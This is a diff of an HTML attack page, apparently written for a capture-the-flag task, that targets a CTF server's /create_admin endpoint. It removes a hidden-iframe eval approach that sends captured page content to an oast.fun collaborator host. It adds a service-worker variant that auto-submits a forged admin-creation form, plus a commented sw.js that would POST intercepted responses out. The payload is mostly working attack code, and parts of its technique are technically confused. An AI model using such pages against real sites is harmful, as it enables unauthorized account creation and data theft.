@@ -1,56 +1,45 @@
 <!DOCTYPE html>
 <html>
 <body>
-<iframe id="targetFrame" style="display:none"></iframe>
-
 <script>
 const TARGET = 'https://tasks.goidactf.ru:20431';
 const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 
-// 1. Загружаем iframe с целевым сайтом
-const iframe = document.getElementById('targetFrame');
-iframe.src = TARGET + '/admin';
-
-iframe.onload = function() {
-    // 2. Когда iframe загрузился, выполняем в нём скрипт
-    try {
-        const script = `
-            // Этот код выполнится в контексте целевого сайта!
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = '/create_admin';
-            form.innerHTML = '<input name="new_admin_login" value="FROM_SAME_ORIGIN">';
-            document.body.appendChild(form);
-            form.submit();
-            
-            // Ждём результат
-            setTimeout(() => {
-                // Теперь читаем ответ (same-origin, CORS не блокирует!)
-                const result = document.body.innerHTML;
-                
-                // Отправляем через postMessage родителю
-                parent.postMessage({
-                    type: 'result',
-                    data: result.substring(0, 2000)
-                }, '*');
-            }, 2000);
-        `;
+// Регистрируем service worker
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('/sw.js').then(registration => {
+        console.log('Service Worker registered');
         
-        iframe.contentWindow.eval(script);
-    } catch(e) {
-        navigator.sendBeacon(COLLAB + '/error', 'iframe_eval_error: ' + e.message);
-    }
-};
+        // Отправляем форму через service worker
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = TARGET + '/create_admin';
+        form.innerHTML = '<input name="new_admin_login" value="SERVICE_WORKER_TEST">';
+        document.body.appendChild(form);
+        form.submit();
+    });
+}
 
-// 3. Получаем результат
-window.addEventListener('message', function(event) {
-    if (event.data && event.data.type === 'result') {
-        navigator.sendBeacon(
-            COLLAB + '/capture',
-            event.data.data
-        );
-    }
-});
+// sw.js должен быть на твоём сервере:
+// self.addEventListener('fetch', event => {
+//     if (event.request.url.includes('create_admin')) {
+//         event.respondWith(
+//             fetch(event.request).then(response => {
+//                 // Клонируем response чтобы прочитать
+//                 const cloned = response.clone();
+//                 cloned.text().then(text => {
+//                     // Отправляем на коллаборатор
+//                     fetch('https://COLLAB/capture', {
+//                         method: 'POST',
+//                         mode: 'no-cors',
+//                         body: text
+//                     });
+//                 });
+//                 return response;
+//             })
+//         );
+//     }
+// });
 </script>
 </body>
 </html>
